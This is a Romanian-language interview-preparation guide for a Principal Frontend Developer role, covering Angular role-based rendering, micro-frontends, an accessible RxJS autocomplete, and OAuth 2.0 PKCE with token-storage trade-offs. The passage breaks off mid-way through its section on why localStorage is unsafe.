# 13 - Raspunsuri Ideale la Interviu Real (Principal Frontend Developer)

> Acest fisier contine raspunsurile complete la cele 3 intrebari primite la interviu, structurate asa cum ar raspunde un Principal Engineer. Include nu doar continutul tehnic, ci si **cum sa comunici** - framework de raspuns, intrebari inapoi, gandire la nivel de arhitectura.

---

## Sectiunea 0: Cum vorbesti ca un Principal Engineer

### Framework-ul de raspuns

Un Principal Engineer nu sare direct la implementare. Structureaza raspunsul astfel:

```
1. "Depinde de context..." → arata ca nu exista solutie universala
2. "Intai as intreba..." → clarifici cerintele inainte de solutie
3. Enumera optiunile → de la simplu la complex
4. Trade-offs → explica ce castigi si ce pierzi la fiecare
5. Recomandare → "In contextul descris, as merge cu..."
```

### Cum intrebi inapoi inainte de a raspunde

**Nu te grabi sa raspunzi.** Un Principal cere clarificari:

- "Cati utilizatori / roluri diferite avem?"
- "Cat de des se schimba aceste configuratii?"
- "Cate echipe lucreaza pe proiect?"
- "Care sunt cerintele de performanta / security?"
- "Ce stack avem deja? Monorepo, CI/CD existent?"

Asta demonstreaza ca gandesti la **problema reala**, nu la solutia favorita.

### Gandire la nivel de arhitectura, nu doar implementare

| Junior/Mid | Principal |
|------------|-----------|
| "Folosesc ngIf" | "Depinde de cate variatii, cine le gestioneaza si cat de des se schimba" |
| "Fac un input cu debounce" | "Incep de la UX requirements, apoi API contract, apoi implementare" |
| "Pun token in localStorage" | "Trebuie sa analizam threat model-ul: XSS, CSRF, token theft" |

### Cum conduci discutia

- **Nu astepta sa fii ghidat** - ofera structura: "Pot sa abordez asta din 3 unghiuri..."
- **Anticipeaza follow-up-urile** - "Probabil urmatoarea intrebare ar fi cum comunicam intre ele..."
- **Recunoaste ce nu stii** - "Nu am implementat asta in productie, dar stiu ca abordarea e..."
- **Conecteaza cu experienta** - "In proiectul X am ales varianta Y pentru ca..."

---

## Intrebarea 1: Afisarea diferitelor componente in functie de utilizator

### Cum incepi raspunsul

> "Depinde de scala si complexitate. Hai sa discutam variantele de la simplu la complex, si cand se justifica fiecare."

**Intrebari de clarificare:**
- "Cate roluri/tipuri de utilizatori avem?"
- "Componentele difera doar vizual sau sunt feature-uri complet diferite?"
- "Configuratia e statica (definita la build) sau dinamica (din backend)?"
- "Cate echipe lucreaza pe aplicatie?"

---

### Abordarea 1: `@if` / Template conditions (simplu, 2-3 variatii)

**Cand:** Diferente mici intre roluri - ascunzi/afisezi butoane, sectiuni.

```typescript
@Component({
  template: `
    <app-header />

    @if (userRole() === 'admin') {
      <app-admin-dashboard />
    } @else if (userRole() === 'manager') {
      <app-manager-dashboard />
    } @else {
      <app-user-dashboard />
    }

    <app-footer />
  `
})
export class HomePageComponent {
  private authService = inject(AuthService);
  userRole = computed(() => this.authService.currentUser()?.role ?? 'user');
}
```

**Trade-offs:**
- ✅ Simplu, rapid de implementat, usor de inteles
- ✅ Toate componentele sunt in acelasi bundle (sau lazy loaded individual)
- ❌ Nu scaleaza peste 3-4 variatii - template-ul devine haos
- ❌ Toate variantele sunt in acelasi modul - cuplare stransa

---

### Abordarea 2: CanMatch guards + route-based (componente diferite pe aceeasi ruta)

**Cand:** Utilizatorii vad pagini complet diferite pe aceeasi ruta (`/dashboard`), dar vrei routing curat fara `@if` in template.

```typescript
// auth.guards.ts
export const isAdmin: CanMatchFn = () => {
  const auth = inject(AuthService);
  return auth.hasRole('admin');
};

export const isManager: CanMatchFn = () => {
  const auth = inject(AuthService);
  return auth.hasRole('manager');
};

// app.routes.ts - aceeasi ruta, componente diferite
export const routes: Routes = [
  {
    path: 'dashboard',
    canMatch: [isAdmin],
    loadComponent: () => import('./admin/admin-dashboard.component')
      .then(m => m.AdminDashboardComponent)
  },
  {
    path: 'dashboard',
    canMatch: [isManager],
    loadComponent: () => import('./manager/manager-dashboard.component')
      .then(m => m.ManagerDashboardComponent)
  },
  {
    path: 'dashboard',
    // fallback - fara canMatch = se aplica daca niciun alt match
    loadComponent: () => import('./user/user-dashboard.component')
      .then(m => m.UserDashboardComponent)
  }
];
```

**Trade-offs:**
- ✅ Fiecare rol are componenta sa - separare clara
- ✅ Lazy loading natural prin `loadComponent`
- ✅ Routing-ul ramane curat - utilizatorul vede `/dashboard` indiferent de rol
- ❌ Toate componentele trebuie sa fie in acelasi repo/build
- ❌ Nu rezolva problema deploy-ului independent

---

### Abordarea 3: Dynamic components cu `NgComponentOutlet`

**Cand:** Componenta care trebuie afisata se determina la runtime dintr-o configuratie (backend, feature flags).

```typescript
// Component registry - mapeaza string-uri la componente
const COMPONENT_MAP: Record<string, () => Promise<Type<unknown>>> = {
  'admin-dashboard': () => import('./admin/admin-dashboard.component')
    .then(m => m.AdminDashboardComponent),
  'manager-dashboard': () => import('./manager/manager-dashboard.component')
    .then(m => m.ManagerDashboardComponent),
  'user-dashboard': () => import('./user/user-dashboard.component')
    .then(m => m.UserDashboardComponent),
  'analytics-widget': () => import('./widgets/analytics-widget.component')
    .then(m => m.AnalyticsWidgetComponent),
};

// Dynamic loader component
@Component({
  selector: 'app-dynamic-loader',
  standalone: true,
  imports: [NgComponentOutlet],
  template: `
    @if (component()) {
      <ng-container *ngComponentOutlet="component(); injector: customInjector()" />
    } @else {
      <app-loading-skeleton />
    }
  `
})
export class DynamicLoaderComponent {
  componentKey = input.required<string>();

  component = signal<Type<unknown> | null>(null);
  customInjector = signal<Injector>(inject(Injector));

  constructor() {
    effect(async () => {
      const key = this.componentKey();
      const loader = COMPONENT_MAP[key];
      if (loader) {
        const comp = await loader();
        this.component.set(comp);
      }
    });
  }
}

// Folosire - configuratia vine din backend
@Component({
  template: `
    @for (widget of dashboardConfig(); track widget.id) {
      <app-dynamic-loader [componentKey]="widget.componentKey" />
    }
  `
})
export class DashboardPageComponent {
  private configService = inject(DashboardConfigService);
  dashboardConfig = this.configService.getWidgetsForCurrentUser();
}
```

**Trade-offs:**
- ✅ Configuratie 100% dinamica - backend decide ce se afiseaza
- ✅ Lazy loading per componenta
- ✅ Feature flags si A/B testing naturale
- ❌ Tot in acelasi build/deploy
- ❌ Type safety redusa (string keys)
- ❌ Mai greu de depanat - flow-ul nu e vizibil in template

---

### Abordarea 4: Micro-frontends cu Module Federation

**Cand:** Echipe mari (5+), deploy independent, aplicatii enterprise cu parti care au cicluri de release diferite, sau migrare graduala de framework.

> **Cum spui la interviu:** "Daca avem echipe multiple care trebuie sa faca deploy independent, atunci micro-frontends cu Module Federation este solutia. Dar important - overhead-ul e semnificativ, deci trebuie sa fie justificat de scala organizatiei."

#### Ce sunt si cum functioneaza

Micro-frontends extind conceptul de microservicii la frontend. Fiecare echipa detine o parte din aplicatie (un "remote"), cu **deploy independent** si potential **tehnologie diferita**.

Arhitectura: **Shell (host)** + **Remote-uri**

```
┌─────────────────────────────────────────────────────────┐
│                    SHELL (Host App)                       │
│  - Layout, Navigation, Auth                              │
│  - Incarca remote-urile la runtime                       │
│                                                          │
│  ┌──────────┐  ┌──────────┐  ┌──────────┐              │
│  │ Orders   │  │ Users    │  │ Reports  │              │
│  │ Remote   │  │ Remote   │  │ Remote   │              │
│  │ :4201    │  │ :4202    │  │ :4203    │              │
│  └──────────┘  └──────────┘  └──────────┘              │
└─────────────────────────────────────────────────────────┘
```

Fiecare remote expune un fisier `remoteEntry.js` pe care shell-ul il incarca dinamic la runtime.

#### Webpack Module Federation - Configurare

**Shell (host) app:**

```typescript
// webpack.config.js - Shell App
const { ModuleFederationPlugin } = require('webpack').container;

module.exports = {
  plugins: [
    new ModuleFederationPlugin({
      name: 'shell',
      remotes: {
        orders: 'orders@http://localhost:4201/remoteEntry.js',
        users: 'users@http://localhost:4202/remoteEntry.js',
        reports: 'reports@http://localhost:4203/remoteEntry.js',
      },
      shared: {
        '@angular/core': { singleton: true, strictVersion: true },
        '@angular/common': { singleton: true, strictVersion: true },
        '@angular/router': { singleton: true, strictVersion: true },
        rxjs: { singleton: true, strictVersion: true },
      },
    }),
  ],
};
```

**Remote app - expune module catre shell:**

```typescript
// webpack.config.js - Orders Remote
module.exports = {
  plugins: [
    new ModuleFederationPlugin({
      name: 'orders',
      filename: 'remoteEntry.js',
      exposes: {
        './OrdersModule': './src/app/orders/orders.module.ts',
        './OrderWidget': './src/app/orders/widgets/order-widget.component.ts',
      },
      shared: {
        '@angular/core': { singleton: true, strictVersion: true },
        '@angular/common': { singleton: true, strictVersion: true },
        '@angular/router': { singleton: true, strictVersion: true },
        rxjs: { singleton: true, strictVersion: true },
      },
    }),
  ],
};
```

#### Native Federation (Angular 17+ cu esbuild)

Angular 17+ foloseste esbuild ca builder implicit. `@angular-architects/native-federation` ofera Module Federation fara Webpack:

```bash
# Instalare
ng add @angular-architects/native-federation --project shell --type host --port 4200
ng add @angular-architects/native-federation --project orders --type remote --port 4201
```

```typescript
// federation.config.js - Shell (host)
const { withNativeFederation, shareAll } = require('@angular-architects/native-federation/config');

module.exports = withNativeFederation({
  shared: {
    ...shareAll({
      singleton: true,
      strictVersion: true,
      requiredVersion: 'auto',  // citeste din package.json
    }),
  },
  skip: ['rxjs/ajax', 'rxjs/fetch', 'rxjs/testing', 'rxjs/webSocket'],
});

// federation.config.js - Orders (remote)
module.exports = withNativeFederation({
  name: 'orders',
  exposes: {
    './routes': './src/app/orders/orders.routes.ts',
  },
  shared: {
    ...shareAll({
      singleton: true,
      strictVersion: true,
      requiredVersion: 'auto',
    }),
  },
  skip: ['rxjs/ajax', 'rxjs/fetch', 'rxjs/testing', 'rxjs/webSocket'],
});
```

#### Shell app - routing cu lazy loading de remote-uri

```typescript
// app.routes.ts
import { loadRemoteModule } from '@angular-architects/native-federation';

export const appRoutes: Routes = [
  {
    path: '',
    component: ShellLayoutComponent,
    children: [
      {
        path: 'dashboard',
        loadComponent: () =>
          import('./dashboard/dashboard.component')
            .then(m => m.DashboardComponent),
      },
      {
        path: 'orders',
        loadChildren: () =>
          loadRemoteModule('orders', './routes')
            .then(m => m.orderRoutes),
      },
      {
        path: 'users',
        loadChildren: () =>
          loadRemoteModule('users', './routes')
            .then(m => m.userRoutes),
      },
    ],
  },
];

// federation.manifest.json - configureaza remote-urile dinamic
{
  "orders": "http://localhost:4201/remoteEntry.json",
  "users": "http://localhost:4202/remoteEntry.json",
  "reports": "http://localhost:4203/remoteEntry.json"
}

// main.ts - bootstrap cu manifest
import { initFederation } from '@angular-architects/native-federation';

initFederation('federation.manifest.json')
  .then(() => import('./bootstrap'))
  .catch(err => console.error(err));
```

#### Comunicarea intre micro-frontends

> **Cum spui la interviu:** "Comunicarea intre remote-uri este intentionat limitata - daca doua remote-uri comunica foarte mult, probabil ar trebui sa fie in acelasi remote."

**5 optiuni, de la cel mai cuplat la cel mai decuplat:**

**1. Shared services (librarii partajate singleton):**
```typescript
// libs/shared/auth/src/auth.service.ts (in Nx monorepo)
@Injectable({ providedIn: 'root' })
export class SharedAuthService {
  private currentUser = signal<User | null>(null);
  readonly user = this.currentUser.asReadonly();
  readonly isAuthenticated = computed(() => this.currentUser() !== null);

  setUser(user: User): void {
    this.currentUser.set(user);
  }
}

// Orice remote il poate injecta - e singleton shared
// Shell il seteaza la login, remote-urile il citesc
```

**2. Custom Events (cel mai decuplat, cross-framework):**
```typescript
// Remote A - emite eveniment
window.dispatchEvent(new CustomEvent('order:created', {
  detail: { orderId: 123, total: 99.99 }
}));

// Remote B - asculta evenimentul
window.addEventListener('order:created', (event: CustomEvent) => {
  console.log('New order:', event.detail);
  this.refreshDashboard();
});
```

**3. Event Bus service (un Subject global in shell):**
```typescript
// libs/shared/event-bus/src/event-bus.service.ts
@Injectable({ providedIn: 'root' })
export class EventBusService {
  private events$ = new Subject<AppEvent>();

  emit(event: AppEvent): void {
    this.events$.next(event);
  }

  on<T extends AppEvent>(eventType: string): Observable<T> {
    return this.events$.pipe(
      filter(e => e.type === eventType)
    ) as Observable<T>;
  }
}

interface AppEvent {
  type: string;
  payload?: unknown;
}
```

**4. Shared state store (NgRx global in shell):**
```typescript
// Shell-ul detine store-ul global
// Remote-urile pot dispatch-ui actiuni si selecta state
// Necesita shared NgRx ca singleton dependency
```

**5. Router state (URL params/query params):**
```typescript
// Comunicare prin URL - cel mai simplu, dar limitat
// /orders?highlight=123 -> remote-ul Orders citeste query param
```

#### Shared dependencies management

Critric - incarci **o singura instanta** de Angular, nu una per remote:

```typescript
const sharedConfig = {
  '@angular/core': {
    singleton: true,         // o singura instanta in tot ecosistemul
    strictVersion: true,     // versiunile trebuie sa fie compatibile
    requiredVersion: '^17.0.0',  // toate remote-urile pe Angular 17.x
  },
  '@angular/common': { singleton: true, strictVersion: true },
  '@angular/router': { singleton: true, strictVersion: true },
  '@angular/forms': { singleton: true, strictVersion: true },
  '@ngrx/store': { singleton: true, strictVersion: true },
  rxjs: { singleton: true, strictVersion: true },

  // Librarii interne partajate
  '@myorg/shared-ui': { singleton: true, strictVersion: true },
  '@myorg/auth': { singleton: true, strictVersion: true },
};
```

#### Shared libraries cu Nx monorepo + enforce-module-boundaries

```
// Structura Nx monorepo
apps/
  shell/          # Host app
  orders/         # Remote app
  users/          # Remote app
libs/
  shared/
    ui/           # Componente UI partajate (buttons, modals, etc.)
    auth/         # AuthService, guards, interceptors
    models/       # Interfete TypeScript partajate
    event-bus/    # Comunicare intre remote-uri
  orders/
    data-access/  # Servicii specifice orders
    feature/      # Feature components
  users/
    data-access/
    feature/
```

```json
// nx.json sau .eslintrc.json - enforce-module-boundaries
{
  "rules": {
    "@nx/enforce-module-boundaries": [
      "error",
      {
        "depConstraints": [
          {
            "sourceTag": "type:app",
            "onlyDependOnLibsWithTags": ["type:feature", "type:shared"]
          },
          {
            "sourceTag": "type:feature",
            "onlyDependOnLibsWithTags": ["type:data-access", "type:shared"]
          },
          {
            "sourceTag": "scope:orders",
            "onlyDependOnLibsWithTags": ["scope:orders", "scope:shared"]
          }
        ]
      }
    ]
  }
}
```

#### Trade-offs: cand merita vs cand nu

| Aspect | Avantaje | Dezavantaje |
|--------|----------|-------------|
| **Deploy** | Independent per echipa | Complexitate CI/CD crescuta |
| **Echipe** | Autonomie ridicata | Coordonare necesara pt shared deps |
| **Performance** | Incarci doar ce e necesar | Overhead la runtime (remoteEntry.js) |
| **Testare** | Testare izolata per remote | Integration testing complex |
| **UX** | N/A | Risc de inconsistenta vizuala |
| **Debugging** | Module boundaries clare | Debugging cross-remote dificil |
| **Onboarding** | Fiecare echipa invata doar remote-ul sau | Intelegerea ecosistemului e complexa |

**Regula de decizie:**
- **1-3 echipe** → monorepo cu lazy loaded modules e suficient
- **3-5 echipe** → Nx monorepo cu enforce-module-boundaries
- **5+ echipe** → micro-frontends cu Module Federation

---

## Intrebarea 2: Cum construiesti un autocomplete

### Cum incepi raspunsul

> "Un autocomplete pare simplu, dar are multe edge cases. As incepe de la UX requirements, apoi API contract, si la final implementarea. Pot sa structurez raspunsul in straturile astea?"

**Intrebari de clarificare:**
- "Datele vin de la un API REST sau sunt locale?"
- "Cat de mare e datasetul? Sute sau milioane de inregistrari?"
- "Avem cerinte de accessibility (WCAG)?"
- "Trebuie sa suporte multi-select?"

---

### Pipeline-ul RxJS complet

```typescript
// autocomplete.component.ts
@Component({
  selector: 'app-autocomplete',
  standalone: true,
  imports: [ReactiveFormsModule, HighlightPipe],
  changeDetection: ChangeDetectionStrategy.OnPush,
  template: `
    <div class="autocomplete-wrapper" role="combobox"
         [attr.aria-expanded]="showDropdown()"
         aria-haspopup="listbox">

      <!-- Input -->
      <input
        [formControl]="searchControl"
        [attr.aria-activedescendant]="activeDescendant()"
        aria-autocomplete="list"
        aria-controls="suggestions-list"
        (keydown)="onKeyDown($event)"
        (focus)="onFocus()"
        (blur)="onBlur()"
        placeholder="Cauta..."
      />

      <!-- Loading indicator -->
      @if (loading()) {
        <span class="spinner" aria-hidden="true"></span>
      }

      <!-- Dropdown cu sugestii -->
      @if (showDropdown()) {
        <ul id="suggestions-list" role="listbox" class="dropdown">
          @for (item of results(); track item.id; let i = $index) {
            <li
              role="option"
              [id]="'option-' + i"
              [class.active]="i === activeIndex()"
              [attr.aria-selected]="i === activeIndex()"
              (mousedown)="selectItem(item)"
              (mouseenter)="activeIndex.set(i)"
            >
              <span [innerHTML]="item.label | highlight:searchControl.value"></span>
              @if (item.subtitle) {
                <small class="subtitle">{{ item.subtitle }}</small>
              }
            </li>
          } @empty {
            @if (!loading()) {
              <li class="no-results" role="option" aria-disabled="true">
                Niciun rezultat gasit
              </li>
            }
          }
        </ul>
      }
    </div>
  `
})
export class AutocompleteComponent implements OnInit {
  private searchService = inject(SearchService);
  private destroyRef = inject(DestroyRef);

  searchControl = new FormControl('');

  // State signals
  results = signal<SearchResult[]>([]);
  loading = signal(false);
  showDropdown = signal(false);
  activeIndex = signal(-1);

  // Computed pentru accessibility
  activeDescendant = computed(() => {
    const idx = this.activeIndex();
    return idx >= 0 ? `option-${idx}` : null;
  });

  // Output event
  itemSelected = output<SearchResult>();

  ngOnInit(): void {
    this.searchControl.valueChanges.pipe(
      // 1. debounceTime - asteapta 300ms de la ultima tastare
      //    Previne request la FIECARE keystroke
      debounceTime(300),

      // 2. distinctUntilChanged - nu re-cauta daca valoarea e aceeasi
      //    Ex: user tasteaza "ang", sterge "g", retasteaza "g" -> nu re-cauta
      distinctUntilChanged(),

      // 3. filter - minim 2 caractere (reduce load pe server)
      filter((term): term is string => typeof term === 'string' && term.length >= 2),

      // 4. tap - setam loading state INAINTE de request
      tap(() => {
        this.loading.set(true);
        this.activeIndex.set(-1);
      }),

      // 5. switchMap - ANULEAZA request-ul anterior!
      //    User tasteaza "ang" -> request 1 pleaca
      //    Apoi tasteaza "angular" -> request 1 ANULAT, request 2 pleaca
      //    FARA switchMap: request 1 ar putea reveni DUPA request 2 -> date gresite!
      switchMap(term =>
        this.searchService.search(term).pipe(
          // catchError INAUNTRUL switchMap - eroarea nu ucide stream-ul principal
          catchError(() => {
            // Poti afisa mesaj de eroare aici
            return of([]);
          })
        )
      ),

      takeUntilDestroyed(this.destroyRef)
    ).subscribe(results => {
      this.results.set(results);
      this.loading.set(false);
      this.showDropdown.set(results.length > 0);
    });

    // Inchidem dropdown-ul cand se goleste input-ul
    this.searchControl.valueChanges.pipe(
      filter(term => !term || term.length < 2),
      takeUntilDestroyed(this.destroyRef)
    ).subscribe(() => {
      this.results.set([]);
      this.loading.set(false);
      this.showDropdown.set(false);
    });
  }

  // ---- Keyboard navigation ----
  onKeyDown(event: KeyboardEvent): void {
    const results = this.results();
    if (!results.length) return;

    switch (event.key) {
      case 'ArrowDown':
        event.preventDefault();
        this.activeIndex.update(i => Math.min(i + 1, results.length - 1));
        break;

      case 'ArrowUp':
        event.preventDefault();
        this.activeIndex.update(i => Math.max(i - 1, 0));
        break;

      case 'Enter':
        event.preventDefault();
        const idx = this.activeIndex();
        if (idx >= 0 && idx < results.length) {
          this.selectItem(results[idx]);
        }
        break;

      case 'Escape':
        this.showDropdown.set(false);
        this.activeIndex.set(-1);
        break;
    }
  }

  selectItem(item: SearchResult): void {
    this.searchControl.setValue(item.label, { emitEvent: false });
    this.showDropdown.set(false);
    this.activeIndex.set(-1);
    this.itemSelected.emit(item);
  }

  onFocus(): void {
    if (this.results().length > 0) {
      this.showDropdown.set(true);
    }
  }

  onBlur(): void {
    // Delay pentru a permite click pe optiune
    setTimeout(() => this.showDropdown.set(false), 200);
  }
}
```

### Pattern Signal -> RxJS -> Signal (Angular modern)

> **Cum spui la interviu:** "In Angular modern, cel mai bun pattern pentru autocomplete combina Signals pentru UI binding si RxJS pentru logica asincrona - debounce, cancellation, retry. E cel mai bun din ambele lumi."

```typescript
@Component({
  template: `
    <input (input)="query.set($event.target.value)" />
    <p>{{ results().length }} rezultate</p>
    @for (r of results(); track r.id) {
      <div>{{ r.label }}</div>
    }
  `
})
export class SignalAutocompleteComponent {
  private api = inject(SearchService);

  // Signal input de la user
  query = signal('');

  // Step 1: Signal -> Observable (pentru operatori de timp)
  private query$ = toObservable(this.query);

  // Step 2: RxJS pipeline cu debounce + switchMap
  private results$ = this.query$.pipe(
    debounceTime(300),
    distinctUntilChanged(),
    switchMap(q => q.length < 2
      ? of([])
      : this.api.search(q).pipe(catchError(() => of([])))
    )
  );

  // Step 3: Observable -> Signal (pentru template)
  // Nu mai ai nevoie de async pipe!
  results = toSignal(this.results$, { initialValue: [] });
}
```

**De ce acest pattern?**
- **Signals** pentru template binding → simplu, no `async` pipe, buna integrare cu `@if`/`@for`
- **RxJS** pentru logica de timp → `debounceTime`, `switchMap` (cancellation), `retry`
- **Separare clara** → Signals sunt "ce afisez", RxJS este "cum procesez"

### Highlight Pipe

```typescript
@Pipe({ name: 'highlight', standalone: true })
export class HighlightPipe implements PipeTransform {
  transform(text: string, search: string | null): string {
    if (!search || search.length < 2) return text;

    // Escapam caractere speciale regex
    const escaped = search.replace(/[.*+?^${}()|[\]\\]/g, '\\$&');
    const regex = new RegExp(`(${escaped})`, 'gi');

    return text.replace(regex, '<mark>$1</mark>');
  }
}
```

### Caching (pentru sugestii frecvente)

```typescript
@Injectable({ providedIn: 'root' })
export class SearchService {
  private http = inject(HttpClient);
  private cache = new Map<string, { data: SearchResult[]; timestamp: number }>();
  private readonly CACHE_TTL = 5 * 60 * 1000; // 5 minute

  search(term: string): Observable<SearchResult[]> {
    const cached = this.cache.get(term);
    if (cached && Date.now() - cached.timestamp < this.CACHE_TTL) {
      return of(cached.data);
    }

    return this.http.get<SearchResult[]>('/api/search', {
      params: { q: term }
    }).pipe(
      tap(results => {
        this.cache.set(term, { data: results, timestamp: Date.now() });

        // Limiteaza marimea cache-ului
        if (this.cache.size > 100) {
          const oldest = this.cache.keys().next().value;
          if (oldest) this.cache.delete(oldest);
        }
      })
    );
  }
}
```

### Virtual scrolling (pentru liste mari)

```typescript
// Daca API-ul returneaza sute de rezultate
import { CdkVirtualScrollViewport, CdkFixedSizeVirtualScroll, CdkVirtualForOf } from '@angular/cdk/scrolling';

@Component({
  imports: [CdkVirtualScrollViewport, CdkFixedSizeVirtualScroll, CdkVirtualForOf],
  template: `
    @if (showDropdown()) {
      <cdk-virtual-scroll-viewport itemSize="40" class="dropdown" style="height: 300px">
        <li *cdkVirtualFor="let item of results(); trackBy: trackById"
            role="option">
          {{ item.label }}
        </li>
      </cdk-virtual-scroll-viewport>
    }
  `
})
```

### Accessibility checklist

> **Cum spui la interviu:** "Un autocomplete fara accessibility e incomplet. Minimul e ARIA roles si keyboard navigation."

| ARIA Attribute | Pe ce element | Scop |
|---------------|---------------|------|
| `role="combobox"` | wrapper div | Identifica pattern-ul |
| `aria-expanded` | wrapper div | Dropdown deschis/inchis |
| `aria-haspopup="listbox"` | wrapper div | Tipul dropdown-ului |
| `aria-autocomplete="list"` | input | Tipul autocomplete |
| `aria-controls` | input | ID-ul listei de sugestii |
| `aria-activedescendant` | input | ID-ul optiunii active (keyboard nav) |
| `role="listbox"` | ul | Lista de optiuni |
| `role="option"` | li | Fiecare optiune |
| `aria-selected` | li | Optiunea selectata/activa |

**Keyboard support:** `ArrowDown`/`ArrowUp` = navigare, `Enter` = selectare, `Escape` = inchidere.

---

## Intrebarea 3: Autentificare OAuth 2.0 + Cookies

### Cum incepi raspunsul

> "Depinde de cerinte - avem mai multe optiuni de auth. Cel mai comun in SPA-uri enterprise este OAuth 2.0 cu PKCE. Hai sa parcurgem flow-ul complet, de la redirect pana la token management si security considerations."

**Intrebari de clarificare:**
- "Avem un Identity Provider existent (Auth0, Azure AD, Keycloak)?"
- "E nevoie de SSO cu alte aplicatii?"
- "Ce tip de backend - BFF (Backend for Frontend) sau API direct?"

---

### OAuth 2.0 Authorization Code Flow cu PKCE

> **Cum spui la interviu:** "PKCE (Proof Key for Code Exchange) e obligatoriu pentru SPA-uri. Fara PKCE, un atacator care intercepteaza authorization code-ul poate obtine token-urile. PKCE rezolva asta cu un challenge criptografic."

**Flow-ul complet in 6 pasi:**

```
1. Client genereaza code_verifier (random string) si code_challenge (SHA-256 hash)
2. Client redirecteaza utilizatorul catre Authorization Server cu code_challenge
3. Utilizatorul se autentifica si autorizeaza aplicatia
4. Authorization Server redirecteaza inapoi cu authorization_code
5. Client trimite code + code_verifier la token endpoint
6. Authorization Server verifica ca SHA-256(code_verifier) == code_challenge
   si returneaza access_token + refresh_token
```

```
┌──────────┐     ┌──────────┐     ┌──────────────────┐
│  Browser  │     │  Backend  │     │  Auth Server      │
│  (SPA)    │     │  (API)    │     │  (IdP)            │
└─────┬─────┘     └─────┬─────┘     └────────┬──────────┘
      │                  │                     │
      │  1. Generate code_verifier +           │
      │     code_challenge (SHA-256)           │
      │                                        │
      │  2. Redirect to /authorize ──────────> │
      │     ?code_challenge=xxx                │
      │     &code_challenge_method=S256        │
      │                                        │
      │  3. User logs in + consents            │
      │                                        │
      │  4. Redirect back ◄─────────────────── │
      │     ?code=AUTH_CODE&state=xxx          │
      │                                        │
      │  5. POST /token ──────────────────────>│
      │     code=AUTH_CODE                     │
      │     code_verifier=yyy                  │
      │                                        │
      │  6. Verify SHA-256(yyy) == xxx         │
      │     Return tokens ◄────────────────────│
      │                                        │
```

**Implementare completa:**

```typescript
@Injectable({ providedIn: 'root' })
export class OAuthService {
  private readonly http = inject(HttpClient);
  private readonly AUTH_URL = 'https://auth.example.com';
  private readonly CLIENT_ID = 'my-angular-app';
  private readonly REDIRECT_URI = 'https://app.example.com/callback';

  // ---- PASUL 1+2: Initiere login cu PKCE ----
  async initiateLogin(): Promise<void> {
    const codeVerifier = this.generateCodeVerifier();
    const codeChallenge = await this.generateCodeChallenge(codeVerifier);
    const state = this.generateState();

    // Stocam temporar (necesare la callback) - sessionStorage e OK aici
    // (nu e un token, e un verifier temporar)
    sessionStorage.setItem('pkce_code_verifier', codeVerifier);
    sessionStorage.setItem('oauth_state', state);

    const params = new URLSearchParams({
      response_type: 'code',
      client_id: this.CLIENT_ID,
      redirect_uri: this.REDIRECT_URI,
      scope: 'openid profile email',
      state: state,                        // protectie CSRF
      code_challenge: codeChallenge,
      code_challenge_method: 'S256'
    });

    window.location.href = `${this.AUTH_URL}/authorize?${params}`;
  }

  // ---- PASUL 4+5: Handle callback ----
  async handleCallback(code: string, state: string): Promise<void> {
    // Verificam state-ul (protectie CSRF)
    const savedState = sessionStorage.getItem('oauth_state');
    if (state !== savedState) {
      throw new Error('Invalid state parameter - possible CSRF attack');
    }

    const codeVerifier = sessionStorage.getItem('pkce_code_verifier');

    const tokens = await firstValueFrom(
      this.http.post<AuthTokens>(`${this.AUTH_URL}/token`, {
        grant_type: 'authorization_code',
        code,
        redirect_uri: this.REDIRECT_URI,
        client_id: this.CLIENT_ID,
        code_verifier: codeVerifier    // Server-ul verifica SHA-256(verifier) == challenge
      })
    );

    // Curatam datele temporare
    sessionStorage.removeItem('pkce_code_verifier');
    sessionStorage.removeItem('oauth_state');

    this.authService.handleTokens(tokens);
  }

  // ---- PKCE helpers ----
  private generateCodeVerifier(): string {
    const array = new Uint8Array(32);
    crypto.getRandomValues(array);
    return this.base64UrlEncode(array);
  }

  private async generateCodeChallenge(verifier: string): Promise<string> {
    const encoder = new TextEncoder();
    const data = encoder.encode(verifier);
    const hash = await crypto.subtle.digest('SHA-256', data);
    return this.base64UrlEncode(new Uint8Array(hash));
  }

  private generateState(): string {
    const array = new Uint8Array(16);
    crypto.getRandomValues(array);
    return this.base64UrlEncode(array);
  }

  private base64UrlEncode(buffer: Uint8Array): string {
    return btoa(String.fromCharCode(...buffer))
      .replace(/\+/g, '-')
      .replace(/\//g, '_')
      .replace(/=+$/, '');
  }
}
```

---

### JWT: Access Token vs Refresh Token

```
Access Token (JWT)                    Refresh Token
├─ Durata scurta: 15-30 minute       ├─ Durata lunga: 7-30 zile
├─ Contine claims (rol, email)       ├─ Opac (doar server-ul il intelege)
├─ Trimis cu fiecare request API     ├─ Folosit DOAR pentru a obtine
│  (Authorization: Bearer xxx)       │  un nou access token
├─ Stocat IN MEMORIE (variabila JS)  ├─ Stocat in HttpOnly cookie
└─ Daca e furat: damage limitat      └─ Daca e furat: atacatorul poate
   (expira in minute)                   genera access tokens noi
```

**Structura unui JWT:**
```
Header.Payload.Signature

// Header
{ "alg": "RS256", "typ": "JWT" }

// Payload
{
  "sub": "user-id-123",
  "email": "user@example.com",
  "roles": ["admin", "editor"],
  "iat": 1700000000,           // Issued At
  "exp": 1700003600,           // Expiration (1 ora)
  "iss": "https://auth.example.com",
  "aud": "https://app.example.com"
}

// Signature = RS256(header + "." + payload, private_key)
```

---

### Strategia hibrida de stocare (RECOMANDAT)

> **Cum spui la interviu:** "Recomand strategia hibrida: access token in memorie, refresh token in HttpOnly cookie. E cel mai sigur compromis intre securitate si UX."

```
┌─────────────────────────────────────────────────────┐
│                    BROWSER                           │
│                                                      │
│  ┌─────────────────────┐  ┌──────────────────────┐  │
│  │  JavaScript Memory   │  │  HttpOnly Cookie      │  │
│  │                      │  │                       │  │
│  │  access_token = xxx  │  │  refresh_token = yyy  │  │
│  │  (15-30 min)         │  │  (7-30 zile)          │  │
│  │                      │  │                       │  │
│  │  ✅ Rapid acces      │  │  ✅ Inaccesibil JS    │  │
│  │  ❌ Se pierde la     │  │  ✅ Trimis automat    │  │
│  │     refresh pagina   │  │  ❌ Vulnerabil CSRF   │  │
│  └─────────────────────┘  └──────────────────────┘  │
│                                                      │
│  La refresh pagina: se face silent refresh           │
│  folosind refresh token-ul din cookie                │
└─────────────────────────────────────────────────────┘
```

---

### De ce NU localStorage

> **Cum spui la interviu:** "localStorage e vulnerabil la XSS. Daca un atacator reuseste sa injecteze un script (XSS), poate citi ORICE din localStorage. Un HttpOnly cookie NU poate fi citit din JavaScript - asta e diferenta fundamentala."

```typescript
// ❌ PERICULOS: Token in localStorage
localStorage.setItem('access_token', token);

